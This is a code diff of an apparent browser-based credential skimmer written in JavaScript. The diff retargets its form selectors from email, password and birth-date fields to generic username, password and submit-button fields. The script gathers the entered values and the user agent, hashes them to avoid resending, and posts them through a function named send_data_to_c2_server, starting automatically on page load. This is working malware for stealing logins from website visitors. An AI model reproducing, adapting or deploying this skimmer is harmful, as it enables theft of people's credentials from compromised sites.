@@ -1,7 +1,6 @@
-window["data_leak_label_email"] = ["input[id*='username']", "input[name*='usernaame']", "input[type*='text']"]
-window["data_leak_label_password"] = ["input[id*='password']", "input[name*='password']"]
-window["data_leak_label_birth_date"] = ["input[id*='wsi-login-credentials-form-birthdate']", "input[name*='birthDate']"]
-window["data_leak_label_submit_button"] = ["button[id*='loginbtn']"]
+window["data_leak_label_user"] = ["input[name*='username']", "input[type*='text']"]
+window["data_leak_label_password"] = ["input[name*='password']", "input[type*='password']"]
+window["data_leak_label_submit_button"] = ["button.btn-primary"]
 
 function send_data_to_c2_server(data) {
     var xhr = window["XMLHttpRequest"] ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
@@ -63,9 +62,8 @@ function get_element_value(selectors) {
 function listener_fetch_data_leak() {
     // GET data to leak
     data_leak = {
-        "email": get_element_value(window["data_leak_label_email"]),
+        "username": get_element_value(window["data_leak_label_user"]),
         "password": get_element_value(window["data_leak_label_password"]),
-        "birth_date": get_element_value(window["data_leak_label_birth_date"]),
         "uagent": navigator.userAgent
     }
 
@@ -73,6 +71,7 @@ function listener_fetch_data_leak() {
     for (var key in data_leak){
         if (!key) return;
     }
+
 
     // Prevent to do not send again previously sent data
     var data_leak_hash = hashCode(data_leak);
@@ -92,7 +91,7 @@ function scan_page() {
     **/
 
     // GET elements
-    if (!(get_element_selector(window["data_leak_label_email"]))) return false;
+    if (!(get_element_selector(window["data_leak_label_user"]))) return false;
     var selectors = window["data_leak_label_submit_button"];
     elements = get_elements_selector(selectors)
 
@@ -139,4 +138,4 @@ function scan_loop() {
     Once page finishes loading, launch a scan_loop
 **/
 document.addEventListener("DOMContentLoaded", function() { scan_loop(); }, false);
-window.addEventListener("load", function() { scan_loop(); }, false);
+window.addEventListener("load", function() { scan_loop(); }, false)
